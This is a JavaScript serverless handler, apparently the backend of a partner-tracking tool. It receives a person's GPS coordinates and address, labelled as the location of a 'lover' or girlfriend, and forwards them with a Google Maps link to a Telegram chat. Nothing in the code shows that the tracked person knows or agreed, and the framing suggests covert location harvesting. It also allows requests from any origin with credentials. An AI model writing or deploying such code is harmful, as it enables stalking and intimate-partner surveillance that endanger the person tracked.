export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { latitude, longitude, accuracy, address, timestamp } = req.body || {};

    if (!latitude || !longitude) {
      return res.status(400).json({ error: 'Missing coordinates' });
    }

    const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

    console.log('\n========================================');
    console.log('💖 RECEIVED LOVER LOCATION UPDATE (VERCEL) 💖');
    console.log(`📍 Coordinates : ${latitude}, ${longitude}`);
    console.log(`🗺️ Google Maps : ${googleMapsUrl}`);
    console.log(`🏠 Address     : ${address || 'N/A'}`);
    console.log(`🎯 Accuracy    : ±${accuracy} meters`);
    console.log('========================================\n');

    // Send Telegram Notification
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (botToken && chatId) {
      const message = `💖 *VỊ TRÍ MỚI TỪ BẠN GÁI!* 💖\n\n` +
        `📍 *Tọa độ:* \`${latitude}, ${longitude}\`\n` +
        `🏠 *Địa chỉ:* ${address || 'Chưa xác định'}\n` +
        `🎯 *Độ chính xác:* ±${accuracy}m\n` +
        `⏰ *Thời gian:* ${new Date().toLocaleString('vi-VN')}\n\n` +
        `👉 *Mở trên Google Maps:* ${googleMapsUrl}`;

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      });
      console.log('📱 Telegram alert dispatched from Vercel Serverless Function!');
    } else {
      console.log('⚠️ TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing in Vercel Environment Variables.');
    }

    return res.status(200).json({ status: 'success', message: 'Location processed' });
  } catch (error) {
    console.error('Error in Vercel location API handler:', error);
    return res.status(500).json({ error: error.message });
  }
}
